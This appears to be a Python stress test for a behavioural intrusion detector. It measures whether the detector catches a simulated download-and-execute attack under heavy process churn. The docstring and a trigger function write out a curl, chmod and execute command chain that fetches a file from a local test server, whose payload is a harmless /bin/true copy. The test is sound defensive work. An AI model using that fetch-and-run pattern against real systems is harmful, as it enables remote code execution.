#!/usr/bin/env python3
"""Detection under process fan-out.

Runs Sentinel headless with every pattern from the guide loaded, starts
short-lived processes at a steady rate from one parent (tools/execstress),
and every ten seconds plays the guide's download-and-execute attack:

    curl -o /tmp/.../x http://127.0.0.1:PORT/x ; chmod +x x ; ./x

It then reports how many of the attacks were detected, the detection latency
Sentinel measured, its CPU and memory, and the event bus depth over time.

usage (as root, on Linux, from the repository root):

    go build -o /tmp/sentinel ./cmd/sentinel
    go build -o /tmp/execstress ./tools/execstress
    sudo python3 tools/fanoutstress/fanout.py /tmp/sentinel /tmp/execstress [label] [rate] [seconds] [profile]

With a sixth argument, CPU and allocation profiles are saved beside the log.
"""
import http.server, os, re, shutil, socketserver, subprocess, sys, threading, time

binary, stresser = sys.argv[1], sys.argv[2]
label = sys.argv[3] if len(sys.argv) > 3 else "run"
rate = int(sys.argv[4]) if len(sys.argv) > 4 else 5000
seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
profile = len(sys.argv) > 6

here = os.path.dirname(os.path.abspath(__file__))
repo = os.path.dirname(os.path.dirname(here))
run = "/tmp/fanout-" + label
shutil.rmtree(run, ignore_errors=True)
os.makedirs(run + "/configs")

# Every complete pattern in the guide.
guide = open(repo + "/docs/behavioral-patterns.md").read().split("```")
blocks = [b[5:] for b in guide[1::2] if b.startswith("yaml\n- name:")]
with open(run + "/configs/patterns.yaml", "w") as f:
    f.write("patterns:\n")
    for b in blocks:
        f.write("".join("  " + l + "\n" if l else "\n" for l in b.rstrip("\n").split("\n")))
print("patterns loaded from the guide:", len(blocks), flush=True)

payload = open("/bin/true", "rb").read()


class Slow(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        half = len(payload) // 2
        self.wfile.write(payload[:half])
        self.wfile.flush()
        time.sleep(4)  # outlive the two-second network poll
        self.wfile.write(payload[half:])

    def log_message(self, *a):
        pass


class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


srv = Server(("127.0.0.1", 0), Slow)
threading.Thread(target=srv.serve_forever, daemon=True).start()
url = "http://127.0.0.1:%d/x" % srv.server_address[1]

log = open(run + "/sentinel.log", "w")
args = ["python3", here + "/ptyrun.py", str(seconds + 40), binary, "--headless", "--process-collector=ebpf", "--health-interval=10s"]
if profile:
    args.append("--pprof-addr=127.0.0.1:6060")
sent = subprocess.Popen(args, cwd=run, stdout=log, stderr=subprocess.STDOUT)
time.sleep(8)
pid = int(subprocess.check_output(["pgrep", "-f", "^" + binary + " --headless"]).split()[0])


def cpu():
    f = open("/proc/%d/stat" % pid).read().rsplit(")", 1)[1].split()
    return (int(f[11]) + int(f[12])) / 100.0


def rss():
    return int(re.search(r"VmRSS:\s+(\d+)", open("/proc/%d/status" % pid).read()).group(1))


c0, t0 = cpu(), time.time()
stress = subprocess.Popen([stresser, "-rate", str(rate), "-duration", "%ds" % (seconds + 10)], stdout=subprocess.PIPE, text=True)
time.sleep(5)
if profile:
    subprocess.Popen(["curl", "-s", "-o", run + "/cpu.pprof", "http://127.0.0.1:6060/debug/pprof/profile?seconds=30"])

triggers = []


def trigger(n):
    d = "/tmp/sentinel-trig-%s-%d" % (label, n)
    shutil.rmtree(d, ignore_errors=True)
    os.makedirs(d)
    # The trailing command keeps the shell from exec'ing the payload in place.
    subprocess.run(["sh", "-c", "curl -s -o %s/x %s; chmod +x %s/x; %s/x; true" % (d, url, d, d)])
    triggers.append(n)
    shutil.rmtree(d, ignore_errors=True)


threads = []
for n in range(seconds // 10):
    th = threading.Thread(target=trigger, args=(n,))
    th.start()
    threads.append(th)
    time.sleep(10)
for th in threads:
    th.join()
if profile:
    subprocess.run(["curl", "-s", "-o", run + "/heap.pprof", "http://127.0.0.1:6060/debug/pprof/allocs"])
out = stress.communicate()[0].strip()
c1, t1, r1 = cpu(), time.time(), rss()
print(out)
time.sleep(12)  # let anything queued be reported
c2 = cpu()
sent.wait()

text = open(run + "/sentinel.log").read()
fired = len(re.findall(r"FINDING .*rule=download-and-execute", text))
health = [l for l in text.split("\n") if "HEALTH" in l]


def field(line, k):
    m = re.search(k + r"=(-?\d+)", line)
    return int(m.group(1)) if m else -1


last = health[-1] if health else ""
print("triggers=%d fired=%d" % (len(triggers), fired))
print("cpu_during_stress=%.1f%% of one core (%.1fs over %.0fs); cpu_in_12s_after=%.1fs; rss=%d MB"
      % (100 * (c1 - c0) / (t1 - t0), c1 - c0, t1 - t0, c2 - c1, r1 // 1024))
print("bus_depth samples:", [field(l, "bus_depth") for l in health], "bus_waited=%d" % field(last, "bus_waited"))
for k in ["detection_latency_count", "detection_latency_p50_us", "detection_latency_p99_us", "detection_latency_max_us",
          "kernel_drops", "starts", "exits", "findings", "findings_suppressed", "tombstones_evicted",
          "search_candidates", "search_work_deferred", "full_rescans", "sequence_searches_aborted",
          "sequences_possibly_truncated", "descendant_walks_truncated", "bus_published"]:
    print("  %s=%d" % (k, field(last, k)))
rules = {}
for m in re.finditer(r"FINDING .*rule=(\S+)", text):
    rules[m.group(1)] = rules.get(m.group(1), 0) + 1
print("findings by rule:", rules)
